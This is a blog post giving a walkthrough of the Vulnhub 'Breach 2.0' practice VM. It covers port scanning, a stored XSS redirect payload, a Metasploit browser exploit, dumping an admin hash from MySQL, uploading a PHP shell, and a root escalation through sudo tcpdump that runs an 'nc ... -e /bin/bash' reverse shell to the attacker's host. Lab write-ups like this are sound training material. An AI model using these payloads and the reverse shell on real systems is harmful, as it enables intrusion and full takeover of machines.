@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>
+    
+      Breach 2.0 &middot; T0w3ntum
+    
+  </title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png">
+</head>
+
+
+  <body>
+    <nav class="nav">
+      <div class="nav-container">
+        <a href="/">
+          <h2 class="nav-title">T0w3ntum</h2>
+        </a>
+        <ul>
+          <li><a href="/about">About</a></li>
+          <li><a href="/">Posts</a></li>
+        </ul>
+    </div>
+  </nav>
+
+    <main>
+      <div class="post">
+  <div class="post-info">
+    <span>Written by</span>
+    
+        T0w3ntum
+    
+
+    
+      <br>
+      <span>on&nbsp;</span><time datetime="2016-08-22 00:00:00 -0500">August 22, 2016</time>
+    
+  </div>
+
+  <h1 class="post-title">Breach 2.0</h1>
+  <div class="post-line"></div>
+
+  <p>This has been one of the funner vulnerable VM’s I’ve done over at vulnhub so far. mrb3n813
+sure can knock them out!</p>
+
+<h2 id="breach-20"><a href="https://www.vulnhub.com/entry/breach-2,159/">Breach 2.0</a></h2>
+
+<p>Let’s start with a quick nmap scan and see what we are working with.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Vulnhub/Breach2# nmap -p- -T4 --min-rate=400 192.168.110.151
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-08-15 19:23 EDT
+Nmap scan report for 192.168.110.151
+Host is up (0.0011s latency).
+Not shown: 65532 closed ports
+PORT      STATE SERVICE
+111/tcp   open  rpcbind
+48983/tcp open  unknown
+65535/tcp open  unknown
+MAC Address: 00:0C:29:C5:9E:D6 (VMware)
+</code></pre></div></div>
+
+<p>Looks like we have a couple of unknown ports so let’s enumerate those some more.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Vulnhub/Breach2# nmap -p 111,48983,65535 -sV -A 192.168.110.151
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-08-15 19:24 EDT
+Nmap scan report for 192.168.110.151
+Host is up (0.00076s latency).
+PORT      STATE SERVICE VERSION
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          33962/udp  status
+|_  100024  1          48983/tcp  status
+48983/tcp open  status  1 (RPC #100024)
+65535/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u2 (protocol 2.0)
+| ssh-hostkey:
+|   1024 f3:53:9a:0b:40:76:b1:02:87:3e:a5:7a:ae:85:9d:26 (DSA)
+|   2048 9a:a8:db:78:4b:44:4f:fb:e5:83:6b:67:e3:ac:fb:f5 (RSA)
+|_  256 c1:63:f1:dc:8f:24:81:82:35:fa:88:1a:b8:73:40:24 (ECDSA)
+MAC Address: 00:0C:29:C5:9E:D6 (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1
+closed port
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.0
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.76 ms 192.168.110.151
+
+OS and Service detection performed. Please report any incorrect results at
+https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 35.30 seconds
+</code></pre></div></div>
+
+<p>SSH is running on 65535. Let’s have a look at that banner.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Vulnhub/Breach2# ssh -p 65535 peter@192.168.110.151
+#############################################################################
+#                  Welcome to Initech Cyber Consulting, LLC                 #
+#                 All connections are monitored and recorded                #
+#                     Unauthorized access is encouraged                     #
+#             Peter, if that's you - the password is in the source.         #
+#          Also, stop checking your blog all day and enjoy your vacation!   #
+#############################################################################
+</code></pre></div></div>
+
+<p>The password is in the source…Interesting. So far I haven’t seen any source code or web
+pages so I’m not sure what this means. I decided to go digging some more, did a quick UDP
+scan and came up with this.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Vulnhub/Breach2# nmap -sU --top-ports 100 192.168.110.151
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-08-15 19:27 EDT
+Nmap scan report for 192.168.110.151
+Host is up (0.0011s latency).
+Not shown: 98 closed ports
+PORT     STATE SERVICE
+111/udp  open  rpcbind
+5353/udp open  zeroconf
+MAC Address: 00:0C:29:C5:9E:D6 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 113.22 seconds
+root@kali:~/Vulnhub/Breach2# nmap -sU -p U:5353 192.168.110.151 -A
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-08-15 19:31 EDT
+Nmap scan report for 192.168.110.151
+Host is up (0.00082s latency).
+PORT     STATE SERVICE VERSION
+5353/udp open  mdns    DNS-based service discovery
+| dns-service-discovery:
+|   9/tcp workstation
+|_    Address=192.168.110.151 fe80:0:0:0:20c:29ff:fec5:9ed6
+MAC Address: 00:0C:29:C5:9E:D6 (VMware)
+Too many fingerprints match this host to give specific OS details
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.82 ms 192.168.110.151
+
+OS and Service detection performed. Please report any incorrect results at
+https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.81 seconds
+</code></pre></div></div>
+
+<p>So some DNS service running on UDP 5353. Might be of use later, but for now I couldn’t
+enumerate it much. I decided to go back to the SSH banner…Maybe mrb3n813 is playing a
+trick on us.</p>
+
+<p>I tried multiple attemps until I finally landed on <strong>inthesource</strong>. I assume this was the
+right password when we are thrown out of SSH after one attempt instead of the standard
+three. So now I know the password, but that didn’t get me anywhere. Knowing how these VM’s
+work though, let’s see if another port opened up.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Vulnhub/Breach2# nmap -p- -T4 --min-rate=400 192.168.110.151
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-08-15 21:03 EDT
+Nmap scan report for 192.168.110.151
+Host is up (0.0012s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE
+80/tcp    open  http
+111/tcp   open  rpcbind
+48983/tcp open  unknown
+65535/tcp open  unknown
+MAC Address: 00:0C:29:C5:9E:D6 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 20.52 seconds
+</code></pre></div></div>
+
+<p>Look at that, now we have a webpage!</p>
+
+<p><img src="/images/breach2/beef.jpg" alt="BEEF" /></p>
+
+<p>A slight hint maybe ;)</p>
+
+<p>Remembering the SSH text, a quick browse to http://192.168.110.151/blog/ gives me a nice
+little blog page. Looks like it’s running BlogPHP and appears to be vulnerable to some
+stored XSS per this <a href="https://www.exploit-db.com/exploits/17640/">Exploit-db</a> entry.</p>
+
+<p>I injected some code to redirect the client to my machine so I can capture the user agent</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;window.location.replace("http://192.168.110.128/random");&lt;/script&gt;
+</code></pre></div></div>
+
+<p>And capture the user agent.</p>
+
+<p><img src="/images/breach2/user-angent.png" alt="User Agent" /></p>
+
+<p>Looks like I’m dealing with Firefox 5.0, lucky for us Metasploit has a module for this. It was as simple as shutting down apache
+and loading up the module. What is missing from the below screenshot is me upgradating to a meterpreter shell with</p>
+
+<blockquote>
+  <p>sessions -u 1</p>
+</blockquote>
+
+<p><img src="/images/breach2/low-priv.png" alt="Low Priv" /></p>
+
+<p>Sweet, we now have a shell as peter. I do some digging and find some interesting stuff in Miltons profile.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">pwd</span>
+/home/milton
+<span class="nv">$ </span><span class="nb">cat</span> .profile
+<span class="c"># ~/.profile: executed by the command interpreter for login shells.</span>
+<span class="c"># This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login</span>
+<span class="c"># exists.</span>
+<span class="c"># see /usr/share/doc/bash/examples/startup-files for examples.</span>
+<span class="c"># the files are located in the bash-doc package.</span>
+
+<span class="c"># the default umask is set in /etc/profile; for setting the umask</span>
+<span class="c"># for ssh logins, install and configure the libpam-umask package.</span>
+<span class="c">#umask 022</span>
+
+<span class="c"># if running bash</span>
+<span class="k">if</span> <span class="o">[</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$BASH_VERSION</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+    <span class="c"># include .bashrc if it exists</span>
+    <span class="k">if</span> <span class="o">[</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$HOME</span><span class="s2">/.bashrc"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+        <span class="nb">.</span> <span class="s2">"</span><span class="nv">$HOME</span><span class="s2">/.bashrc"</span>
+    <span class="k">fi
+fi</span>
+
+<span class="c"># set PATH so it includes user's private bin if it exists</span>
+<span class="k">if</span> <span class="o">[</span> <span class="nt">-d</span> <span class="s2">"</span><span class="nv">$HOME</span><span class="s2">/bin"</span> <span class="o">]</span> <span class="p">;</span> <span class="k">then
+    </span><span class="nv">PATH</span><span class="o">=</span><span class="s2">"</span><span class="nv">$HOME</span><span class="s2">/bin:</span><span class="nv">$PATH</span><span class="s2">"</span>
+<span class="k">fi
+
+</span>python /usr/local/bin/cd.py
+<span class="nb">sudo</span> /etc/init.d/nginx start &amp;&gt; /dev/null
+
+<span class="nb">sudo</span><span class="o">()</span> <span class="o">{</span>
+        <span class="nb">echo</span> <span class="s2">"Sorry, user milton may not run sudo on breach2."</span>
+<span class="o">}</span>
+<span class="nb">readonly</span> <span class="nt">-f</span> <span class="nb">sudo</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">1</span> <span class="n">milton</span> <span class="n">milton</span>  <span class="mi">380</span> <span class="n">Jun</span> <span class="mi">29</span> <span class="mo">01</span><span class="p">:</span><span class="mi">09</span> <span class="n">cd</span><span class="o">.</span><span class="n">py</span>
+<span class="err">$</span> <span class="n">cat</span> <span class="n">cd</span><span class="o">.</span><span class="n">py</span>
+<span class="c">#!/usr/bin/python</span>
+
+<span class="kn">import</span> <span class="nn">signal</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIG_IGN</span><span class="p">)</span>
+
+<span class="n">countdown</span><span class="o">=</span><span class="mi">3</span>
+
+<span class="k">while</span> <span class="n">countdown</span> <span class="o">&gt;</span><span class="mi">0</span><span class="p">:</span>
+        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">countdown</span><span class="p">)</span>
+        <span class="n">countdown</span> <span class="o">-=</span><span class="mi">1</span>
+<span class="k">if</span> <span class="n">countdown</span> <span class="o">&lt;</span><span class="mi">1</span><span class="p">:</span>
+        <span class="n">question</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">"Whose stapler is it?"</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">question</span> <span class="o">==</span> <span class="s">"mine"</span><span class="p">:</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"echo 'Woot!'"</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"kill -9 </span><span class="si">%</span><span class="s">d"</span><span class="o">%</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getppid</span><span class="p">()))</span>
+        <span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>So it looks like when Milton logs in, it starts nginx and asks a simple question. This looks like the next logical step, only
+problem is I don’t know Miltons password. A little more digging turned up an interesting port listening on localhost that I
+didn’t see in the nmap scans.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>peter@breach2:/usr/local/bin$ netstat -lntp
+netstat -lntp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:57243           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:2323          0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::45131                :::*                    LISTEN      -
+tcp6       0      0 :::111                  :::*                    LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+</code></pre></div></div>
+
+<p>Possibly telnet?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>telnet 127.0.0.1 2323
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+29 45'46" N 95 22'59" W
+</code></pre></div></div>
+
+<p>Look at that, some interesting coordinates. Quick search on google maps show’s it to be Houston Texas, possibly Miltons password?</p>
+
+<p><img src="/images/breach2/milton-user.png" alt="Milton" /></p>
+
+<p>I tried a couple variations of Houston Texas before landing on <strong>Houston</strong>…Yeah, the obviouse one right :). Anyway, we are now
+in as Milton and a quick check shows that nginx started and is listening on 8888.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>milton@breach2:/var/www/html2/oscommerce$ ps -aux | grep nginx
+root      2315  0.0  0.6  91184  3076 ?        Ss   19:14   0:00 nginx: master process /usr/sbin/nginx -g daemon on;
+master_process on;
+root      2316  0.0  0.7  91492  3696 ?        S    19:14   0:00 nginx: worker process
+root      2317  0.0  0.7  91492  3696 ?        S    19:14   0:00 nginx: worker process
+root      2318  0.0  0.7  91492  3696 ?        S    19:14   0:00 nginx: worker process
+root      2319  0.0  0.7  91492  3696 ?        S    19:14   0:00 nginx: worker process
+milton    2420  0.0  0.4  12732  2036 pts/3    S+   19:17   0:00 grep nginx
+milton@breach2:/var/www/html2/oscommerce$ netstat -lntp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:57243           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:2323          0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::8888                 :::*                    LISTEN      -
+tcp6       0      0 :::45131                :::*                    LISTEN      -
+tcp6       0      0 :::111                  :::*                    LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+tcp6       0      0 ::1:2323                :::*                    LISTEN      -
+</code></pre></div></div>
+
+<p>Looks like nginx was running an oscommerce CMS on port 8888. I went ahead and dumped the admin hash from the MySQL database and
+started poking around the admin interface. The admin hash was easy enough to google, it’s just <strong>admin</strong>.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>milton@breach2:/var/www/html2/oscommerce$ mysql -u root
+
+mysql&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| blog               |
+| mysql              |
+| oscommerce         |
+| performance_schema |
++--------------------+
+5 rows in set (0.08 sec)
+
+mysql&gt; use oscommerce;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql&gt; show tables;
++-------------------------------------------+
+| Tables_in_oscommerce                      |
++-------------------------------------------+
+| osc_address_book                          |
+| osc_administrators                        |
++-------------------------------------------+
+CUT SOME TEXT
+
+mysql&gt; select * from osc_administrators;
++----+-----------+-------------------------------------+
+| id | user_name | user_password                       |
++----+-----------+-------------------------------------+
+|  1 | admin     | 685cef95aa31989f2edae5e055ffd2c9:32 |
++----+-----------+-------------------------------------+
+1 row in set (0.00 sec)
+</code></pre></div></div>
+
+<p>Within the oscommerce admin interface, there was a place to upload files. This screenshot is missing for some reason so I’ll go
+back and get it later and update the post with it. Anyway, I was able to upload a php shell and execute it getting a connection
+back as yet another user!</p>
+
+<p><img src="/images/breach2/next-user.png" alt="Blumbergh" /></p>
+
+<p>This part was the fun part, easy, but fun. As always, I check the users permissions.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo -l
+Matching Defaults entries for blumbergh on breach2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User blumbergh may run the following commands on breach2:
+    (root) NOPASSWD: /usr/sbin/tcpdump
+</code></pre></div></div>
+
+<p>Nice, I can use tcpdump. A quick google for possible exploits around this and I find an interesting one
+<a href="https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/">here</a></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /tmp/.test
+nc 192.168.110.128 4446 -e /bin/bash
+
+$ chmod +x /tmp/.test
+$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+dropped privs to root
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+Maximum file limit reached: 1
+</code></pre></div></div>
+
+<p>Set up my listener and got a shell back as root!</p>
+
+<p><img src="/images/breach2/flag.png" alt="ROOT" /></p>
+
+
+</div>
+
+<div class="pagination">
+  
+    <a href="/2016-08-28/CYSTEME" class="left arrow">&#8592;</a>
+  
+  
+    <a href="/2016-08-17/6day-lab" class="right arrow">&#8594;</a>
+  
+
+  <a href="#" class="top">Top</a>
+</div>
+
+    </main>
+
+    <footer>
+      <span>
+        &copy; <time datetime="2018-02-24 19:06:05 -0600">2018</time> . Made with Jekyll using the <a href="https://github.com/chesterhow/tale/">Tale</a> theme.
+      </span>
+    </footer>
+  </body>
+</html>
